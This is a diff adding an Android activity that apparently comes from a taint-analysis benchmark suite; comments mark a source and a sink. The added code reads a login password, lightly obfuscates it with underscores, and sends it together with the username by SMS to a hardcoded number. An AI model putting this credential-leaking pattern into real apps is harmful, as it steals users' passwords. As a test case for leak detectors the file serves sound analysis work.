@@ -22,4 +22,42 @@ import de.ecspride.data.User;
  *  String/char transformations
  */
 public class PrivateDateLeakage extends Activity {
+
+    private User user = null;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_private_date_leakage);
+    }
+
+    @Override
+    protected void onRestart() {
+        EditText usernameText = (EditText) findViewById(R.id.username);
+        EditText passwordText = (EditText) findViewById(R.id.password);
+        String uname = usernameText.toString();
+        // source
+        String pwd = passwordText.getText().toString();
+        user = new User(uname, pwd);
+    }
+
+    public void sendMessage(View view) {
+        if (user != null) {
+            String password = getPassword();
+            String obfuscatedUsername = "";
+            for (char c : password.toCharArray()) obfuscatedUsername += c + "_";
+            String message = "User: " + user.getUsername() + " | Pwd: " + obfuscatedUsername;
+            SmsManager smsmanager = SmsManager.getDefault();
+            // sink, leak
+            smsmanager.sendTextMessage("+49 1234", null, message, null, null);
+        }
+    }
+
+    private String getPassword() {
+        if (user != null)
+            return user.getPwd().getPassword();
+        else {
+            return null;
+        }
+    }
 }
